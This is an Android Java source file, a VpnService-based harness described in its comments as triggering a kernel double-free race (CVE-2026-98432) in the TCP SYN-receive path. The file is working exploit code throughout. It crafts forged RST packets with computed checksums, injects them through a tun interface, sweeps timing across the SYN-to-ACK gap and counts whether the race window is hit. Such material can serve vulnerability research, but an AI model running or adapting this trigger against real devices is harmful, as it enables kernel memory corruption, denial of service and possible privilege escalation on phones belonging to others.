package com.mini;

import android.content.Intent;
import android.net.VpnService;
import android.os.ParcelFileDescriptor;
import android.util.Log;

import java.io.FileOutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicLong;

/**
 * Dual-path harness for CVE-2026-98432.
 *
 * The whole point is that the two halves of the race are driven through
 * different kernel paths:
 *
 *   CPU A -- a real socket connects to one of our own addresses. The
 *            destination is a local address, so ip_route_input() resolves
 *            RTN_LOCAL and the packet is delivered inside the connect()
 *            syscall. The ACK that reaches tcp_v4_syn_recv_sock() is
 *            therefore produced on a normal syscall path, not on the tun
 *            softirq path.
 *
 *   CPU B -- forged RSTs go in through the tun. tcp_check_req() drops the
 *            request sock for any RST without consulting the sequence number
 *            (verified in the shipped vmlinux), so an RST that lands while
 *            syn_recv_sock() is running makes inet_ehash_nolisten() fail,
 *            which is the path that frees inet_opt and then frees it again.
 *
 * Both halves used to share the single per-tun_file write queue lock, which
 * serialised them and made the race impossible. That is what this split fixes.
 *
 * Counters tell us which case we are in:
 *   ok grows, rst stays 0 -> the RSTs are dropped before reaching the socket
 *                            (source is a local address and accept_local=0,
 *                            so martian_source kills them)
 *   rst grows             -> the RSTs reach the request socket and the race
 *                            window is actually being exercised
 */
public class MiniVpn extends VpnService implements Runnable {

    static final String TAG = "MiniVpn";

    /** Address of the tun. This becomes a local address of the device. */
    static final String IP = "10.7.7.1";
    /** Listener port. */
    static final int PORT = 47777;
    /** Client source ports are SPORT_BASE + (0 .. SPORT_RANGE-1). */
    static final int SPORT_BASE = 20000;
    static final int SPORT_RANGE = 20000;
    /** Prime stride so consecutive rounds do not reuse a port too soon. */
    static final int SPORT_STRIDE = 997;
    /** Number of RSTs fired per round, kept below the tun tx queue depth. */
    static final int BURST = 64;

    static volatile String status = "idle";
    static final AtomicLong rounds = new AtomicLong();
    static final AtomicLong okCount = new AtomicLong();
    static final AtomicLong rstCount = new AtomicLong();
    static final AtomicLong errCount = new AtomicLong();

    /** Hand-off between the client loop and the single persistent RST thread. */
    private final AtomicBoolean armed = new AtomicBoolean(false);
    private volatile int targetSport = 0;
    private volatile long armNanos = 0;
    private volatile long delayNanos = 0;

    private ParcelFileDescriptor pfd;
    private FileOutputStream fos;
    private volatile boolean running = false;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (running) {
            return START_STICKY;
        }
        try {
            Builder b = new Builder();
            b.setSession("mini");
            b.addAddress(IP, 32);
            pfd = b.establish();
            if (pfd == null) {
                status = "establish returned null";
                Log.e(TAG, status);
                return START_STICKY;
            }
            fos = new FileOutputStream(pfd.getFileDescriptor());
            running = true;
            new Thread(this, "driver").start();
            status = "running";
            Log.i(TAG, "tun up on " + IP + "/32");
        } catch (Throwable t) {
            status = "start failed: " + t;
            Log.e(TAG, "start", t);
        }
        return START_STICKY;
    }

    @Override
    public void run() {
        startListener();
        sleepQuiet(300);
        Thread rstThread = new Thread(new Runnable() {
            @Override
            public void run() {
                rstLoop();
            }
        }, "rst");
        rstThread.start();
        clientLoop();
    }

    private void startListener() {
        Thread t = new Thread(new Runnable() {
            @Override
            public void run() {
                ServerSocket ss = null;
                try {
                    ss = new ServerSocket();
                    ss.setReuseAddress(true);
                    ss.bind(new InetSocketAddress(InetAddress.getByName(IP), PORT), 128);
                    while (running) {
                        Socket s = ss.accept();
                        s.close();
                    }
                } catch (Throwable ex) {
                    status = "listener: " + ex;
                    Log.e(TAG, "listener", ex);
                } finally {
                    closeQuiet(ss);
                }
            }
        }, "listen");
        t.start();
    }

    /**
     * Single persistent writer, one burst per round, so we never create a
     * thread per attempt.
     */
    private void rstLoop() {
        while (running) {
            if (!armed.compareAndSet(true, false)) {
                Thread.yield();
                continue;
            }
            int sport = targetSport;
            long fireAt = armNanos + delayNanos;
            while (System.nanoTime() < fireAt) {
                // spin: the interesting window is only a few microseconds wide
            }
            byte[] pkt = buildRst(sport);
            for (int k = 0; k < BURST; k++) {
                try {
                    fos.write(pkt);
                } catch (Throwable t) {
                    errCount.incrementAndGet();
                    break;
                }
            }
        }
    }

    private void clientLoop() {
        int i = 0;
        while (running) {
            i++;

            int sport = SPORT_BASE + ((i * SPORT_STRIDE) % SPORT_RANGE);
            targetSport = sport;
            // Sweep the arrival delay across the SYN -> ACK gap.
            delayNanos = ((long) (i % 20)) * 30000L;
            armNanos = System.nanoTime();
            armed.set(true);

            Socket c = new Socket();
            try {
                c.setReuseAddress(true);
                c.bind(new InetSocketAddress(InetAddress.getByName(IP), sport));
                c.connect(new InetSocketAddress(IP, PORT), 100);
                okCount.incrementAndGet();
            } catch (Throwable t) {
                rstCount.incrementAndGet();
            } finally {
                closeQuiet(c);
            }
            rounds.incrementAndGet();
        }
    }

    private byte[] buildRst(int sport) {
        byte[] p = new byte[40];
        int addr = toInt(IP);

        p[0] = 0x45;
        put16(p, 2, 40);
        put16(p, 4, (int) (System.nanoTime() & 0xffff));
        put16(p, 6, 0x4000);
        p[8] = 64;
        p[9] = 6;
        put32(p, 12, addr);
        put32(p, 16, addr);
        put16(p, 10, csum(p, 0, 20, 0));

        put16(p, 20, sport);
        put16(p, 22, PORT);
        put32(p, 24, (int) System.nanoTime());
        put32(p, 28, 0);
        p[32] = 0x50;
        p[33] = 0x04;
        put16(p, 34, 0);
        put16(p, 36, 0);
        put16(p, 38, 0);

        int sum = 0;
        sum += ((addr >> 16) & 0xffff) + (addr & 0xffff);
        sum += ((addr >> 16) & 0xffff) + (addr & 0xffff);
        sum += 6;
        sum += 20;
        put16(p, 36, csum(p, 20, 20, sum));
        return p;
    }

    static int toInt(String s) {
        String[] a = s.split("\\.");
        return ((Integer.parseInt(a[0]) & 0xff) << 24)
                | ((Integer.parseInt(a[1]) & 0xff) << 16)
                | ((Integer.parseInt(a[2]) & 0xff) << 8)
                | (Integer.parseInt(a[3]) & 0xff);
    }

    static void put16(byte[] b, int o, int v) {
        b[o] = (byte) ((v >> 8) & 0xff);
        b[o + 1] = (byte) (v & 0xff);
    }

    static void put32(byte[] b, int o, int v) {
        b[o] = (byte) ((v >> 24) & 0xff);
        b[o + 1] = (byte) ((v >> 16) & 0xff);
        b[o + 2] = (byte) ((v >> 8) & 0xff);
        b[o + 3] = (byte) (v & 0xff);
    }

    static int csum(byte[] b, int off, int len, int init) {
        long s = init & 0xffffffffL;
        for (int i = 0; i < len; i += 2) {
            int hi = b[off + i] & 0xff;
            int lo = (i + 1 < len) ? (b[off + i + 1] & 0xff) : 0;
            s += (hi << 8) | lo;
        }
        while ((s >> 16) != 0) {
            s = (s & 0xffff) + (s >> 16);
        }
        return (int) (~s) & 0xffff;
    }

    static void closeQuiet(java.io.Closeable c) {
        if (c == null) {
            return;
        }
        try {
            c.close();
        } catch (Throwable ignored) {
        }
    }

    static void sleepQuiet(long ms) {
        try {
            Thread.sleep(ms);
        } catch (Throwable ignored) {
        }
    }
}